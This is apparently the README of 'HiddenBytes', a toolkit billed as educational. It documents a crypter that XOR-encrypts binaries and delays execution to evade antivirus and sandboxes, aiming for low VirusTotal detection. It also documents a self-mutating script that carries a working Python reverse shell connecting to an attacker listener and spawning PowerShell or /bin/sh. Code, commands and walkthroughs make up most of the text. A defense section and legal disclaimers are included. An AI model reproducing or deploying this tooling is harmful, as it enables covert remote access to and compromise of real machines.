# HiddenBytes — Binary Evasion & Polymorphic Toolkit

> **Educational Project — Ethical Use Only**
>
> This project is designed for learning about binary obfuscation, evasion techniques, and polymorphic code in a controlled, isolated environment. Unauthorized use of these techniques is prohibited and may violate local laws.

---

## Table of Contents

1. [Project Overview](#project-overview)
2. [Evasion Program Explanation](#evasion-program-explanation)
3. [Polymorphic Program Explanation](#polymorphic-program-explanation)
4. [Walkthroughs](#walkthroughs)
5. [Technical Insights](#technical-insights)
6. [Ethical and Legal Report](#ethical-and-legal-report)
7. [Installation & Setup](#installation--setup)

---

## Project Overview

**HiddenBytes** is a cybersecurity education toolkit consisting of two interrelated programs that explore advanced binary manipulation, obfuscation, and stealth techniques:

| Program | Purpose |
|---------|---------|
| **Evasion Program** | Encrypts and modifies binaries with stealth techniques (file size manipulation, delayed execution) to bypass detection mechanisms |
| **Polymorphic Program** | Generates self-modifying binaries that change their structure on each execution while retaining core reverse shell functionality |

### Learning Objectives

- Understand techniques for binary obfuscation and stealth
- Explore polymorphic behavior in binary files
- Learn practical approaches to bypassing antivirus detection
- Gain hands-on experience with reverse engineering and payload delivery
- Develop insights into ethical considerations for such techniques

### Environment

- **Development & Testing**: Windows-based virtual machine (VirtualBox/VMware)
- **Python**: 3.8 or higher
- **Target Binaries**: Python scripts (`.py`) or compiled executables (`.exe`)

---

## Evasion Program Explanation

### Overview

The **Evasion Program** takes a target binary, encrypts it using XOR-based cryptography, and wraps it in a stealthy Python stub that:

1. **Delays execution** — Waits a configurable number of seconds before running (default: 101s)
2. **Decrypts the payload** — Recovers the original binary using XOR decryption
3. **Executes the target** — Writes the decrypted binary to a temp file and runs it

### How It Encrypts and Modifies Binaries

#### Encryption Engine (XORCipher)

The encryption uses a stream cipher based on the XOR operation:

```
Encryption:  ciphertext[i] = plaintext[i] XOR key[i % len(key)]
Decryption:  plaintext[i]  = ciphertext[i] XOR key[i % len(key)]
```

**Process:**

1. A random 32-character alphanumeric key is generated for each encryption session
2. Each byte of the target binary is XORed with a corresponding byte from the key (cycling through the key bytes)
3. The key is appended to the encrypted data, separated by a delimiter (`||KEY||`)
4. The combined data is base64-encoded and embedded into a Python stub
5. At runtime, the stub extracts the key, decodes the base64 data, and reverses the XOR operation

#### Stealth Techniques

| Technique | Implementation | How It Bypasses Detection |
|-----------|---------------|---------------------------|
| **Encryption** | XOR cipher with random key | Signature-based antivirus cannot match the encrypted binary against known malware signatures |
| **File Size Manipulation** | `--add-size <MB>` appends padding to inflate output to specified size (e.g., 101 MB) | Bypasses size-based heuristics and makes analysis more cumbersome |
| **Execution Delay** | `--delay <seconds>` adds a countdown timer before decryption | Bypasses sandbox analysis tools with short execution timeouts (typically < 60 seconds) |
| **Runtime Decryption** | Binary only exists in plaintext in memory for a brief moment | Static analysis cannot extract the original binary from the encrypted form |
| **Self-Contained Payload** | Everything needed for decryption and execution is embedded in a single file | No external dependencies or network fetches that could be flagged |

#### Generated Stub Architecture

```
┌─────────────────────────────────────────────┐
│           Stealth Payload (.py)             │
├─────────────────────────────────────────────┤
│  # 1. Encrypted payload (base64)            │
│  ENCRYPTED_PAYLOAD = "cGxmR0Z...Z3JvdXA="  │
│                                             │
│  # 2. Configuration                         │
│  DECRYPTION_DELAY = 101                     │
│                                             │
│  # 3. Delay execution                       │
│  delayed_execution() → countdown timer      │
│                                             │
│  # 4. Decrypt payload                       │
│  decrypt_payload() → extract key → XOR      │
│                                             │
│  # 5. Execute binary                        │
│  → Write to temp file → run via subprocess  │
│                                             │
│  # Padding data (for --add-size)            │
│  # PADDING_PADDING_PADDING...               │
└─────────────────────────────────────────────┘
```

### Arguments

| Argument | Description | Default |
|----------|-------------|---------|
| `--encrypt <target-binary>` | Path to the target binary file to encrypt | Required |
| `--output <output-binary>` | Path where the encrypted binary will be saved | Required |
| `--add-size <size-in-mb>` | Increase the binary size (e.g., 101 MB) | 0 |
| `--delay <seconds>` | Execution delay in seconds before the binary runs | 101 |

### Usage

```batch
evasion --encrypt <target-binary> --output <output-binary> [--add-size <MB>] [--delay <seconds>]
```

#### Examples

```batch
evasion --encrypt target.exe --output obfuscated.exe --add-size 101 --delay 101

evasion --encrypt hello.py --output output\stealth.py --add-size 5 --delay 10

evasion --encrypt payload.exe --output output\stealth_payload.py --delay 60
```

---

## Polymorphic Program Explanation

### Overview

The **Polymorphic Program** generates self-modifying Python scripts that change their structure on every execution while preserving their core reverse shell functionality. Each execution:

1. **Self-mutates** — Rewrites its own source code with changed variable names, function names, comments, and mutation signatures
2. **Executes the payload** — After mutation, the script executes the embedded reverse shell payload
3. **Maintains functionality** — Despite completely changing its structure, the core reverse shell behavior is preserved

### How It Generates Self-Modifying Binaries

#### Polymorphic Engine

The generator creates a Python script with several key components:

**1. Name Pools**

Two embedded lists containing dozens of possible variable names and comment strings. These are used by the mutation engine to select replacements:

```python
_VARIABLE_POOL = [
    "socket_handler", "connection_manager", "stream_processor",
    "network_interface", "channel_bridge", "data_relay",
    "session_handle", "link_controller", "pipe_manager",
    ...
]

_COMMENT_POOL = [
    "# Initializing connection handler...",
    "# Establishing secure channel...",
    "# Preparing data stream...",
    ...
]
```

**2. Mutation Identifier**

A unique MD5 hash is embedded as `MUTATION_ID`. On each execution, this is replaced with a new random hash, changing the binary's signature:

```python
MUTATION_ID = "a1b2c3d4e5f6g7h8"
```

**3. Self-Modification Function**

The `_mutate_source()` function is the core of the polymorphic behavior:

```python
def _mutate_source():
    # 1. Read own source code from disk
    source = open(__file__, "r", encoding="utf-8").read()

    # 2. Replace MUTATION_ID with a new random one
    new_id = hashlib.md5(os.urandom(16)).hexdigest()[:16]
    source = source.replace(MUTATION_ID, new_id)

    # 3. Rename variables and functions with new random names
    renames = {old_name: random.choice(_VARIABLE_POOL), ...}
    for old_name, new_name in renames.items():
        source = source.replace(old_name, new_name)

    # 4. Replace comments with new random ones
    for each existing comment:
        replace with random.choice(_COMMENT_POOL)

    # 5. Write mutated source back to file
    open(__file__, "w", encoding="utf-8").write(source)
```

#### Self-Modification Process

```
Initial State:
  MUTATION_ID = "a1b2c3d4"
  def session_handle():
      data_relay = socket.socket(...)
      data_relay.connect(("192.168.1.100", 4444))
      subprocess.call(["powershell.exe", "-NoLogo", "-NoProfile"])

  After Execution #1:
  MUTATION_ID = "e5f6g7h8"  ← Changed!
  def pipe_manager():        ← Renamed!
      channel_bridge = ...   ← Renamed!
      subprocess.call(["powershell.exe", ...])
  # Establishing secure channel...  ← New comment

  After Execution #2:
  MUTATION_ID = "i9j0k1l2"  ← Changed again!
  def alpha_connector():     ← Renamed again!
      beta_handler = ...     ← Renamed again!
      subprocess.call(["powershell.exe", ...])
  # Loading session parameters...  ← Another new comment
```

**Core functionality preserved**: The reverse shell code — `socket.connect()`, `os.dup2()`, `subprocess.call(...)` — remains functionally identical through every mutation. Only names and comments change.

#### Reverse Shell Payload

The reverse shell payload is a Python implementation that:

1. Creates a TCP socket connection to a designated IP and port
2. Redirects standard input, output, and error streams to the socket using `os.dup2()`
3. Spawns an interactive shell (PowerShell on Windows, `/bin/sh` with `--unix` flag)

```python
import socket, subprocess, os
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.1.100", 4444))  # Replace with target IP and port
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
subprocess.call(["powershell.exe", "-NoLogo", "-NoProfile"])
```

**Connection flow:**

```
┌──────────┐         TCP Connect          ┌──────────┐
│  Target   │ ──────────────────────────▶ │ Attacker │
│  Machine  │      port 4444 (default)    │ Listener │
│           │                              │          │
│ dup2(     │                              │ nc -lvnp │
│   socket, │ ◀─────── Shell I/O ──────── │   4444   │
│   stdin)  │                              │          │
│ dup2(     │                              │          │
│   socket, │                              │          │
│   stdout) │                              │          │
│ dup2(     │                              │          │
│   socket, │                              │          │
│   stderr) │                              │          │
│           │                              │          │
│ exec(     │                              │ $ whoami  │
│   powershell)── Shell Access ──────────▶ │ $ dir     │
└──────────┘                              └──────────┘
```

### Arguments

| Argument | Description | Default |
|----------|-------------|---------|
| `--generate <output-binary>` | Path where the polymorphic binary will be generated | Required |
| `--payload <reverse-shell-code>` | Path to payload file, or "default" for built-in | default |
| `--host <ip-address>` | IP address for the reverse shell connection | 192.168.1.100 |
| `--port <port>` | Port for the reverse shell connection | 4444 |
| `--unix` | Generate Unix-compatible payload (`/bin/sh`) instead of Windows PowerShell | off (PowerShell) |

### Usage

```batch
polymorph --generate <output-binary> --payload default --host <IP> --port <PORT>
```

#### Examples

```batch
polymorph --generate polymorphic.exe --payload default

polymorph --generate shell.py --host 192.168.1.100 --port 4444

polymorph --generate unix_shell.py --host 10.0.0.5 --port 5555 --unix
```

---

## Walkthroughs

### Walkthrough 1: Evasion Program — From "Hello World" to Stealth Payload

**Step 1: Create a simple test binary**

Create a file called `hello.py`:

```python
print("Hello, World!")
```

**Step 2: Encrypt it with evasion techniques**

```batch
evasion --encrypt hello.py --output evaded_program.exe --add-size 101 --delay 101
```

Expected output:
```
[SUCCESS] Encryption successful! Encrypted binary saved as 'evaded_program.exe'
[INFO] Final file size: ~101 MB
[INFO] The payload will delay execution by 101 seconds before running.
```

**Step 3: Verify the file size increased**

```batch
dir evaded_program.exe
```

The file should be approximately 101 MB (from the `--add-size 101` flag).

**Step 4: Execute the stealth payload**

```batch
python evaded_program.exe
```

Expected output:
```
[INFO] HiddenBytes Payload Loader
[INFO] Initializing...
[INFO] Execution delayed by 101 seconds...
[INFO] 101 seconds remaining...
[INFO] 100 seconds remaining...
...
[INFO] Delay complete. Proceeding with decryption...
[INFO] Binary decrypted successfully.
[INFO] Target program executed.
Hello, World!
```

**Step 5: Verify the encrypted binary bypasses Windows Defender**

After generating `evaded_program.exe`, copy it to a Windows VM with Windows Defender enabled and scan it. The encrypted binary should pass undetected.

**Step 6: Check VirusTotal detection rate**

Upload `evaded_program.exe` to VirusTotal. The goal is < 40% detection rate (at least 60% of vendors should not detect it).

### Walkthrough 2: Polymorphic Program — Generating and Observing Self-Modification

**Step 1: Generate the polymorphic binary**

```batch
polymorph --generate polymorphic.exe --payload default
```

Expected output:
```
[SUCCESS] Polymorphic binary generated successfully as 'polymorphic.exe'
```

**Step 2: Record the initial mutation signature**

```batch
findstr MUTATION_ID polymorphic.exe
```

Note the unique hash.

**Step 3: Run the polymorphic binary**

```batch
python polymorphic.exe
```

Expected output:
```
╔══════════════════════════════════════════════╗
║     HiddenBytes Polymorphic Binary v1.0      ║
╚══════════════════════════════════════════════╝

[INFO] Mutating binary signature...
[INFO] Polymorphic signature updated successfully.

[INFO] Reverse shell initialized. Attempting connection to attacker...
[INFO] Target: 192.168.1.100:4444

[ERROR] Connection failed: [Errno 10061] No connection could be made...
```

(The connection fails because no listener is active — this is expected and the mutation still occurs.)

**Step 4: Verify the signature changed**

```batch
findstr MUTATION_ID polymorphic.exe
```

The mutation ID is now different from Step 2 — the binary has self-modified!

**Step 5: Run again and observe further mutation**

```batch
python polymorphic.exe
findstr MUTATION_ID polymorphic.exe
```

Each execution produces a different signature. Variable names and comments also change.

### Walkthrough 3: Full Reverse Shell Test (Isolated Environment)

> **⚠️ This test must be performed in a fully isolated VM environment.**

**Prerequisites**: Two terminal windows on the same isolated Windows VM.

**Terminal 1 (Attacker — Listener)**:

```batch
nc -lvnp 4444
```

**Terminal 2 (Target — Executing the payload)**:

```batch
polymorph --generate shell.py --host 127.0.0.1 --port 4444
python shell.py
```

**Expected result on Terminal 1**:

```
listening on [any] 4444 ...
connect to [127.0.0.1] from localhost [127.0.0.1] 49152
Microsoft Windows [Version 10.0.19045.3803]
(c) Microsoft Corporation. All rights reserved.

C:\Users\...>
```

The reverse shell is now active. Commands typed in Terminal 1 execute on Terminal 2.

**To test with a remote IP** (within the isolated VM network):

```batch
polymorph --generate shell.py --host 192.168.56.101 --port 4444
python shell.py
```

---

## Technical Insights

### Binary Structure Analysis

#### Evasion Payload Structure

```
Section           | Content                         | Size
------------------|---------------------------------|----------
Shebang           | #!/usr/bin/env python3          | ~20 B
Docstring         | Module description               | ~200 B
Imports           | base64, subprocess, sys, etc.    | ~150 B
Configuration     | DECRYPTION_DELAY, PADDING_SIZE   | ~100 B
Encrypted Payload | Base64-encoded encrypted data    | variable
Decryption Key    | 32-byte random key (appended)    | 32 B
decrypt_payload() | XOR decryption function          | ~800 B
is_python_script()| Binary type detection            | ~400 B
delayed_execution()| Countdown timer function        | ~700 B
main()            | Execution flow orchestrator      | ~1 KB
Padding           | # PADDING_ comments (if --add-size) | up to 101 MB
```

#### Polymorphic Payload Structure

```
Section              | Purpose                           | Self-Modifies?
---------------------|-----------------------------------|:-------------:
Script Header        | Shebang, docstring, signature     | ✓ (signature)
Imports              | hashlib, os, random, socket, etc. | ✗
_VARIABLE_POOL       | Pool of possible variable names   | ✗ (pool stays)
_COMMENT_POOL        | Pool of possible comments         | ✗ (pool stays)
MUTATION_ID          | Unique mutation signature hash    | ✓ (new each run)
Payload Function     | Reverse shell implementation      | ✓ (renamed each run)
_mutate_source()     | Self-modification logic           | ✓ (names change)
main()               | Entry point with banner           | ✓ (variable names)
NOP Padding Comments | Random filler comments            | ✓ (new each run)
```

### Encryption Methods

#### XOR Stream Cipher

The evasion program uses a simple XOR stream cipher:

- **Algorithm**: Each byte of the plaintext is XORed with a corresponding byte from the key, cycling through the key bytes cyclically
- **Strength**: Fast, simple, no external dependencies, effective against signature-based detection
- **Weakness**: Not cryptographically secure — vulnerable to known-plaintext attacks in production use
- **Purpose**: Protects against signature-based static analysis (not intended for cryptographic security)

```
Plaintext (binary):  01001010 11001010 00101101 ...
Key:                 10110010 01101110 10010010 ...
XOR Result:          11111000 10100100 10111111 ...
```

#### Key Management

- A random 32-character alphanumeric key is generated per encryption session using `random.choices(string.ascii_letters + string.digits, k=32)`
- The key is appended to the encrypted data with the delimiter `||KEY||`
- At runtime, the stub finds the delimiter, extracts the key, and XOR-decrypts the data
- The key never exists outside the generated payload file after encryption

### Stealth Techniques in Detail

| Technique | Implementation | How It Works | What It Bypasses |
|-----------|---------------|--------------|------------------|
| **Encryption** | XOR cipher + base64 encoding | Binary is mathematically transformed using a random key; only the encrypted form is visible in the file | Signature-based antivirus detection (AV cannot match encrypted bytes against known signatures) |
| **File Size Inflation** | Padding bytes (`# PADDING_` comments) appended to reach target size | Large files take longer to scan and analyze; many automated tools have size limits | Size-based heuristics, basic scanners with file size thresholds |
| **Timed Execution Delay** | Countdown timer (1-second sleeps) before decryption | Sandbox environments often have short analysis timeouts; delaying execution causes the analysis to timeout before the payload runs | Sandbox environments with short timeouts (< 60 seconds) |
| **Runtime Decryption** | Binary only decrypted in memory at runtime | Static analysis tools cannot extract the original binary because it never exists in plaintext on disk | Static analysis tools, disassemblers, file scanners |
| **Polymorphic Mutation** | Code rewrites its own source on each execution | Each execution produces a structurally different file with a unique hash, different variable names, and different comments | Signature-based detection, hash-based blacklisting |
| **Random Identifier** | Unique MD5 hash per generation/variant | Prevents fingerprinting and tracking of generated binaries | Fingerprinting tools that track specific binary hashes |

### Reverse Shell Payload Integration

The reverse shell payload is integrated into the polymorphic binary through the following mechanisms:

**1. Payload Generation**

The `build_reverse_shell_payload()` function generates the Python source code for the reverse shell at generation time. The code is embedded directly into the polymorphic script's payload function.

**2. Network Connection**

The payload uses standard Python socket programming:
- Creates a TCP socket (`socket.AF_INET`, `socket.SOCK_STREAM`)
- Connects to the specified IP address and port
- Default port: 4444 (commonly used for netcat listeners)

**3. I/O Redirection**

Standard I/O streams are redirected to the socket using `os.dup2()`:
```python
os.dup2(s.fileno(), 0)  # stdin → socket
os.dup2(s.fileno(), 1)  # stdout → socket
os.dup2(s.fileno(), 2)  # stderr → socket
```

This ensures that all input/output flows through the network connection.

**4. Shell Execution**

After I/O redirection, an interactive shell is spawned:
- **Default (Windows)**: `powershell.exe -NoLogo -NoProfile`
- **With `--unix` flag**: `/bin/sh -i`

**5. Mutation Protection**

The shell command itself does not change during mutation (only variable names and comments change). This ensures the reverse shell always works correctly regardless of how many times the binary has mutated.

**Safe Testing Procedure:**
1. Set up a VirtualBox/VMware VM isolated from your main network and the internet
2. Use host-only networking or internal networking for the VM
3. Use only localhost (127.0.0.1) or isolated VM IPs (e.g., 192.168.56.x)
4. Set up the listener (netcat) on the same machine or VM
5. Never test against real-world systems, networks, or IP addresses
6. Destroy the VM after testing

---

## Ethical and Legal Report

### Ethical Responsibilities

As security professionals and researchers, we have an ethical duty to:

1. **Obtain Explicit Permission** — Never test these techniques against systems you do not own or have written authorization to test. Unauthorized testing is illegal and unethical.

2. **Use in Isolation** — Keep all testing within isolated virtual machine environments. A properly configured VM with host-only networking prevents unintended network access.

3. **Disclose Responsibly** — If you discover vulnerabilities through your research, follow responsible disclosure practices. Notify the affected vendor privately and give them reasonable time to patch before public disclosure.

4. **Educate, Not Exploit** — Use this knowledge to improve security posture, not to compromise systems. Understanding attacker methodologies makes you a better defender.

5. **Respect Privacy** — Never use these techniques to access, monitor, or exfiltrate data without explicit authorization.

6. **Know Your Audience** — When demonstrating or teaching these techniques, ensure your audience understands the ethical and legal boundaries.

### Legal Considerations

The techniques demonstrated in this project have significant legal implications across jurisdictions:

| Jurisdiction | Relevant Laws | Potential Penalties |
|-------------|--------------|-------------------|
| **United States** | Computer Fraud and Abuse Act (CFAA), 18 U.S.C. § 1030 | Fines up to $250,000, imprisonment up to 20 years |
| **European Union** | Directive 2013/40/EU (cybercrime), GDPR | Fines up to €20M or 4% of global annual revenue |
| **United Kingdom** | Computer Misuse Act 1990 | Imprisonment up to 10 years, unlimited fines |
| **Canada** | Criminal Code §342.1, §430(1.1) | Imprisonment up to 10 years |
| **Australia** | Criminal Code Act 1995 (Div 477-478) | Imprisonment up to 10 years |

**Key Legal Principles:**

- **Unauthorized Access**: Using reverse shells or obfuscated binaries to access systems without permission is illegal in virtually all jurisdictions worldwide
- **Computer Misuse**: Modifying, damaging, or impairing the operation of a computer without authorization is a criminal offense
- **Possession of Tools**: Simply possessing hacking tools (including code like this) can be illegal if there is intent to use them unlawfully
- **Extraterritoriality**: Many cybercrime laws apply regardless of where the perpetrator or victim is located — even if both are in different countries
- **Corporate Policies**: Even with permission, violating corporate acceptable use policies can result in termination and legal action

### Recommendations for Detection and Defense

#### Detection Methods

| Detection Method | Description | Indicators |
|-----------------|-------------|------------|
| **Behavioral Analysis** | Monitor for delayed process execution patterns | Processes that sleep for 60-101 seconds before executing main logic |
| **Memory Analysis** | Scan process memory for XOR decryption patterns and shellcode execution | Unusual memory allocations containing decrypted data |
| **Network Monitoring** | Detect reverse shell connections | Unusual outbound TCP connections to uncommon ports (4444, 5555, etc.) |
| **File Size Anomalies** | Flag executables with suspiciously large file sizes | Repetitive padding patterns in files (e.g., repeated `# PADDING_` strings) |
| **Self-Modification Detection** | Monitor file writes to executable paths | A process writing to its own executable file on disk |
| **Static Analysis** | Look for embedded encrypted payloads with decryption stubs | Base64-encoded strings with XOR decryption loops |
| **Sandboxing** | Use longer sandbox timeouts (>120 seconds) | Processes that exhibit delayed execution patterns |
| **File Integrity Monitoring** | Track hash changes of executable files | Executables whose file hash changes between executions (polymorphic) |

#### Mitigation Strategies

| Defense | Implementation |
|---------|---------------|
| **Application Whitelisting** | Only allow approved, signed executables to run. Block unsigned Python scripts |
| **Endpoint Detection & Response (EDR)** | Deploy EDR tools that monitor for behavioral anomalies (delayed execution, self-modification, I/O redirection) |
| **Network Segmentation** | Restrict outbound connections from sensitive systems. Block unusual ports (4444, etc.) |
| **User Education** | Train users to recognize social engineering tactics used in initial access (phishing, malicious downloads) |
| **Code Signing Policies** | Enforce code signing for all executables. Block unsigned PowerShell scripts |
| **PowerShell Constrained Language** | Enable PowerShell Constrained Language Mode to limit scripting capabilities |
| **Application Control** | Use tools like Windows AppLocker or WDAC to control which scripts and executables can run |

### Responsible Use Guidelines

> This project is **strictly for educational purposes**. It is designed to help security professionals, students, and researchers understand how evasion and polymorphism techniques work so they can better defend against them.
>
> **The knowledge gained here should be used to:**
> - Improve organizational security posture
> - Develop better detection and prevention mechanisms
> - Understand attacker methodologies for defensive purposes
> - Prepare for certifications and security roles
>
> **The knowledge gained here should NOT be used to:**
> - Gain unauthorized access to systems
> - Deploy malware or backdoors
> - Exfiltrate data without authorization
> - Violate any laws or terms of service
>
> **Unauthorized use of these techniques is prohibited and may result in legal consequences.**

---

## Installation & Setup

### Prerequisites

- **Windows 10/11** (or Windows VM for testing)
- **Python 3.8 or higher**
- No external dependencies required for core functionality (uses only Python standard library)

### Quick Start

```batch
# Clone or download the project
cd HiddenBytes

# Run the Evasion Program
python -m hiddenbytes evasion --help

# Run the Polymorphic Program
python -m hiddenbytes polymorph --help
```

If `evasion` and `polymorph` are not in your PATH, use:

```batch
python -m hiddenbytes evasion --encrypt target.py --output output\stealth.py --delay 10
python -m hiddenbytes polymorph --generate output\shell.py --host 127.0.0.1 --port 4444
```

### Building Standalone Executables (Optional)

For Windows, you can build standalone `.exe` files that don't require Python:

```batch
# Run the included build script
build_windows.bat

# Or manually:
pip install pyinstaller
pip install -e .
pyinstaller --onefile --distpath release ^
            --name evasion _build_evasion.py
pyinstaller --onefile --distpath release ^
            --name polymorph _build_polymorph.py

# Now you can use:
release\evasion.exe --encrypt target.exe --output obfuscated.exe
release\polymorph.exe --generate shell.py
```

### Project Structure

```
HiddenBytes/
├── hiddenbytes/                 # Main package
│   ├── __init__.py
│   ├── __main__.py              # CLI entry point (python -m hiddenbytes)
│   ├── common/
│   │   ├── __init__.py
│   │   ├── builder.py           # PyInstaller bundler (optional)
│   │   └── cipher.py            # XOR encryption/decryption
│   ├── evasion/
│   │   ├── __init__.py
│   │   ├── cli.py               # Command-line interface
│   │   ├── core.py               # Encryption orchestration
│   │   └── stub.py               # Stealth payload stub generator
│   └── polymorph/
│       ├── __init__.py
│       ├── cli.py                # Command-line interface
│       └── engine.py             # Self-modifying code generator
├── examples/
│   └── hello_world.py            # Sample test binary
├── output/                       # Generated payloads (gitignored)
├── release/                      # Built executables (populated by build_windows.bat)
├── build_windows.bat             # Windows build script
├── setup.py                      # pip-installable package config
├── .gitignore                    # Git ignore rules
└── README.md                     # This documentation
```

### Module Architecture

```
                    hiddenbytes
                         │
           ┌─────────────┴─────────────┐
           │                           │
    evasion/                      polymorph/
    ┌──────────────┐           ┌──────────────┐
    │    cli.py    │           │    cli.py    │
    │     │        │           │     │        │
    │     ▼        │           │     ▼        │
    │   core.py    │           │  engine.py   │
    │     │        │           │ ┌──────────┐ │
    │     ▼        │           │ │Name Pools│ │
    │   stub.py    │           │ │Comment   │ │
    └──────┬───────┘           │ │Pools     │ │
           │                   │ │Mutation  │ │
           │                   │ └──────────┘ │
           │                   └──────┬───────┘
           │                          │
           └────────┬─────────────────┘
                    │
            common/cipher.py
            (XOR encryption)
```

---

## Disclaimer

> ⚠️ **WARNING**: This project is for **educational purposes only**. The techniques demonstrated here simulate real-world attack methods. Unauthorized use of these techniques against systems you do not own or have explicit permission to test is **illegal** and **unethical**.
>
> By using this software, you agree to:
> 1. Use it solely in controlled, isolated environments (virtual machines with host-only networking)
> 2. Never deploy it against production systems without explicit written authorization
> 3. Take full responsibility for any misuse of the code
> 4. Comply with all applicable local, national, and international laws and regulations
>
> **Unauthorized use of reverse shells or obfuscated binaries outside of this controlled project environment is strictly prohibited. Misuse may result in legal consequences.**
>
> The authors and contributors are not responsible for any illegal or unethical use of this software.
